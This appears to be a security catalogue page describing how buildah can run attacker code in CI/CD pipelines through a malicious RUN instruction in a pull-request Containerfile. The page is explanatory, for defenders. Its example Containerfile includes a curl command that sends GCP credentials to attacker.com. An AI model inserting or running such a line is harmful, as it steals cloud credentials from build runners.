---
layout: tool
title: buildah
parent: Living Off The Pipeline
nav_order: 35
---

## Living Off The Pipeline - buildah

`buildah` is a command-line tool for building OCI-compliant container images. It serves as a direct alternative to `docker build` and shares the same powerful "Living Off The Pipeline" (LOTP) vector: the `Containerfile` (or `Dockerfile`).

### First-Order LOTP Tool

`buildah` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by processing a malicious `Containerfile` that contains executable instructions.

#### Malicious Primitive: Remote Code Execution (RCE)

The `buildah bud` (build-using-dockerfile) command builds an image from a `Containerfile`. This file format includes the `RUN` instruction, which is designed to execute arbitrary shell commands to build up the layers of the container image.

An attacker can add a malicious `RUN` instruction to a `Containerfile` in their pull request. When a CI/CD pipeline uses `buildah bud` to build an image from this file, it will execute the attacker's payload on the runner.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a modified `Containerfile` containing a malicious `RUN` instruction.
    ```dockerfile
    # Containerfile
    FROM ubi8
    
    # Legitimate build steps
    RUN dnf install -y httpd
    
    # Malicious payload
    RUN curl --data-binary @$HOME/.gcp/credentials.json http://attacker.com/
    
    # More legitimate steps
    COPY . /var/www/html
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to build the container image.
    ```yaml
    - name: Build application image
      run: buildah bud -t my-app:latest .
    ```

3.  **Execution:**
    *   The `buildah bud` command is executed.
    *   It reads the `Containerfile` from the attacker's pull request.
    *   It executes the `RUN` instructions in order.
    *   The attacker's `curl` command runs, exfiltrating cloud credentials from the CI runner.

This attack is dangerous because the CI/CD workflow file contains a benign and common command. The malicious payload is hidden within a build definition file.

### References

*   [Buildah Tutorial](https://github.com/containers/buildah/blob/main/docs/tutorials/buildah_tutorial.md)
*   [Dockerfile `RUN` instruction](https://docs.docker.com/engine/reference/builder/#run)
